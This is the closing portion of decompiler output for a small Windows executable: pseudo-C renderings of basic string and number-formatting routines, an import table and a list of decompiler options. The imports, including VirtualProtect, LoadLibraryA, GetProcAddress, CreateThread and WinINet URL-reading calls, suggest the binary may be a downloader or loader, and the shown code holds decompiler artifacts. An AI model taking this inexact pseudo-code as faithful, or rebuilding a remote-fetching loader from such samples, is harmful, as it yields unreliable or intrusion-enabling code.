        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        eax = *( *(ebp + 8));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp + 12) = *(ebp + 12) + 1;
        if(eax == 0) {
            break;
        }
    }
    if(*(ebp + 16) != 0) {
        while(!( *(ebp + 16) = *(ebp + 16) - 1)) {
            *( *(ebp + 8)) = 0;
            *(ebp + 8) = *(ebp + 8) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1EA7 - 0x003E1EE1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1EA7()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 12) = *(ebp + 12) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        *(ebp + 8) = *(ebp + 8) + 1;
    }
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1EE2 - 0x003E1F11
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1EE2()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *(ebp + 12);
    }
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1F12 - 0x003E1F65
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1F12()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp + 12) = *(ebp + 12) + 1) {
        eax = *( *(ebp + 8)) & 255;
        if(( *(ebp - 4) = eax - ( *( *(ebp + 12)) & 255)) || *( *(ebp + 12)) == 0) {
            break;
        }
        *(ebp + 8) = *(ebp + 8) + 1;
    }
    if(*(ebp - 4) < 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp - 4) > 0) {
            *(ebp - 4) = 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1F66 - 0x003E1F8D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1F66()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = *(ebp + 8);
    while(1) {
        eax = *( *(ebp - 4));
        *(ebp - 4) = *(ebp - 4) + 1;
        if(eax == 0) {
            break;
        }
    }
    eax = *(ebp - 4) - *(ebp + 8) - 1;
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1F8E - 0x003E1FE3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1F8E()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 16;
    do {
        *(ebp - 12) = *( *(ebp + 8)) & 255;
        *(ebp - 4) = L003E1D70( *(ebp - 12));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp - 16) = *( *(ebp + 12)) & 255;
        *(ebp - 8) = L003E1D70( *(ebp - 16));
        *(ebp + 12) = *(ebp + 12) + 1;
    } while(*(ebp - 4) != 0 && *(ebp - 4) == *(ebp - 8));
    eax = *(ebp - 4) - *(ebp - 8);
    esp = ebp;
}

/*	Procedure: 0x003E1FE4 - 0x003E1FEF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1FE4()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1FF0 - 0x003E200B
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1FF0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    L003E200C(A8, Ac, A10, 0);
    return(Ac);
}

stack space not deallocated on return
/*	Procedure: 0x003E200C - 0x003E20C8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E200C()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 16;
    *(ebp - 4) = *(ebp + 12);
    if(*(ebp + 20) != 0) {
        *( *(ebp - 4)) = 45;
        *(ebp - 4) = *(ebp - 4) + 1;
        *(ebp + 8) = ~( *(ebp + 8));
    }
    *(ebp - 16) = *(ebp - 4);
    do {
        eax = *(ebp + 8);
        edx = 0;
        *(ebp + 16) = *(ebp + 16) / *(ebp + 16);
        *(ebp - 8) = *(ebp + 16) % *(ebp + 16);
        eax = *(ebp + 8);
        edx = 0;
        *(ebp + 16) = *(ebp + 16) / *(ebp + 16);
        edx = *(ebp + 16) % *(ebp + 16);
        *(ebp + 8) = eax;
        if(*(ebp - 8) <= 9) {
            eax = *(ebp - 8) + 48;
            *( *(ebp - 4)) = al;
            *(ebp - 4) = *(ebp - 4) + 1;
        } else {
            eax = *(ebp - 8) + 87;
            *( *(ebp - 4)) = al;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    } while(*(ebp + 8) > 0);
    *( *(ebp - 4)) = 0;
    *(ebp - 4) = *(ebp - 4) - 1;
    do {
        *(ebp - 9) = *( *(ebp - 4));
        eax = *(ebp - 4);
        *eax = *( *(ebp - 16));
        eax = *(ebp - 16);
        *eax = *(ebp - 9);
        *(ebp - 4) = *(ebp - 4) - 1;
        *(ebp - 16) = *(ebp - 16) + 1;
        eax = *(ebp - 16);
    } while(eax < *(ebp - 4));
    esp = ebp;
}

/*	Procedure: 0x003E20C9 - 0x003E2105
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E20C9()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 16) == 10) {
        if(*(ebp + 8) >= 0) {
            goto L003e20ed;
        }
        L003E200C( *(ebp + 8), *(ebp + 12), *(ebp + 16), 1);
    } else {
L003e20ed:
        L003E200C( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    }
    return(*(ebp + 12));
}

/*	Procedure: 0x003E2106 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E2106()
{



}

/* address  size  */
/* 0x003e1b12       0 */ /* unknown */ void 	__entry_point__;
/* 0x003e3000       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x003e3004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x003e3008       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x003e300c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x003e3010       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x003e3014       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x003e3018       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x003e301c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x003e3020       0 */ /* unknown */ void 	__imp__CreatePipe;
/* 0x003e3024       0 */ /* unknown */ void 	__imp__OutputDebugStringA;
/* 0x003e3028       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x003e3030       0 */ /* unknown */ void 	__imp__InternetCloseHandle;
/* 0x003e3034       0 */ /* unknown */ void 	__imp__InternetOpenUrlA;
/* 0x003e3038       0 */ /* unknown */ void 	__imp__InternetOpenA;
/* 0x003e303c       0 */ /* unknown */ void 	__imp__InternetReadFile;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
